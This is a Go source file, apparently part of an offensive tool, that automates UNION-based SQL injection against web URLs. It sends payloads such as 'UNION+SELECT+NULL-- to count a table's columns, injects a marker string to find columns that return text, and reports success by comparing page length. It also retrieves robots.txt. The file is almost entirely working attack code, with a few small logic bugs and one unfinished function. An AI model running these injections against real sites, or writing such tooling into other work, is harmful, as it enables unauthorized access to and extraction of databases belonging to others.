package sql_attacks

import (
	"fmt"
)

func Get_html(url string, url_with_payload string) (string, string) {
	_, original_body, _ := Get_url_req(url)
	_, body, _ := Get_url_req(url_with_payload)

	return original_body, body
}

// TODO: Finish
func Compare_html(original_body string, new_body string) string {
	// HTML that is in the new body
	// but not the original
	return ""
}

// Checks how many columns there are in the SQL table
// Return i = number of columns
// Return 999 = failed
// url is the url of the website
// max_itr is the max amount of columns to check for
func Get_columns_sql_attack(url string, max_itr int) int {
	payload := "'UNION+SELECT"

	null := "+NULL--"

	for i := 0; i <= max_itr; i++ {
		payload += null
		if Url_sql_attack(url, payload+"--") == 0 {
			fmt.Print("\nThere are ", i, " columns.\n\n")
			return i
		}
		fmt.Print(url + payload)
		payload = string([]rune(payload)[:len(payload)-2])
		null = ",+NULL--"
	}
	return 999
}

// Checks wich column that contains text
// Return 1 = Unsuccesful attack
// Return 0 = Successful attack
// url is the url of the website
// max_itr is the max amount of columns to check for
func Columns_containing_text(url string, max_itr int) int {
	payload := "'UNION+SELECT"
	null := "+NULL"
	str := "+'1TByQF'"
	col_with_str := []int{}

	// Number of columns that exists in the database
	columns := Get_columns_sql_attack(url, max_itr)

	fmt.Print("\n\nChecking for columns containing text...\n\n")

	// Checks for string if there is only one column
	if columns == 1 {
		payload += str + "--"

		Url_sql_attack(url, string(payload))
		fmt.Println(payload)

		return 0
	}

	// Test
	for i := 0; i <= columns; i++ {
		payload = "'UNION+SELECT"

		for k := 0; k <= columns; k++ {
			if k == i && k != columns {
				payload += str + ","
			} else if k != columns {
				payload += null + ","
			} else if k == i && k == columns {
				payload += str + "--"
			} else {
				payload += null + "--"
			}
		}

		// Performs SQLi attack
		// Returns 0 if it is successful
		if Url_sql_attack(url, payload) == 0 {
			fmt.Println("\nPayload: ", payload)
			col_with_str = append(col_with_str, i)
		}

	}

	// Returns 0 if there are any columns containing text
	if col_with_str != nil {
		fmt.Println("\nColumns containing text: ", col_with_str, "\n\n")
		return 0
	}

	return 1
}

// SQLi attack by inputting payload in the url
func Url_sql_attack(url string, payload string) int {
	url_with_payload := url + payload

	original_body, body := Get_html(url, url_with_payload)

	return Sqli_status_code(original_body, body)
}

// Checks if the SQLi attack is successful
// by checking for more HTML content
// Status code 0 = successful
// Status code 1 = unsuccesful
func Sqli_status_code(original_body string, new_body string) int {
	original_body_length := len(original_body)
	new_body_length := len(new_body)

	if new_body_length > original_body_length {
		fmt.Print("\nSuccessful attack, there is more content after the SQL injection.\n",
			"HTML length of the orignal body: ", original_body_length, "\n",
			"HTML length of the new body: ", new_body_length, "\n",
		)
		return 0
	} else {
		fmt.Println("\nAttack not successful.\n")
		return 1
	}
}

func Get_robots(url string) (string, error) {
	resp, body, err := Get_url_req(url + "/robots.txt")

	println(resp.StatusCode)
	if err != nil || resp.StatusCode != 200 {
		fmt.Println()
		return "Oops, there is either no robots.txt file or an error occured.", err
	}

	return body, err
}
